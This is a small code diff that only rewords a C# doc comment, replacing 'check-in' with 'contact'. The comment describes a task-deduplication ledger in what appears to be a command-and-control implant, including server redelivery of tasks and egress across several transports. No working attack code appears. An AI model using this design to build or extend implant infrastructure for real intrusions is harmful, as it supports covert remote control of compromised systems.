@@ -6,13 +6,13 @@ namespace Rod.Implant.Internal;
 /// The per-run ledger of task ids this implant has already parsed
 /// (architecture.md Sec 10.3 -- the dispatch strand): the dedup and
 /// result-cache half of the receive-ack arm. A stream that dies before a
-/// task's ack crossed makes the server redeliver it on the next check-in,
+/// task's ack crossed makes the server redeliver it on the next contact,
 /// so the implant must recognize a task it already holds -- re-ack it
 /// without running it twice, and re-send its cached result when the
 /// original delivery died with the stream (either may land first
 /// server-side; the first result wins there).
 ///
-/// Shared by every check-in client covering one run, the same way the
+/// Shared by every contact client covering one run, the same way the
 /// replay-nonce floor is: a task dispatched on one carrier can be
 /// redelivered on another when the egress walk crosses shapes, so the
 /// ledger spans transports, not connections. Bounded -- an implant runs
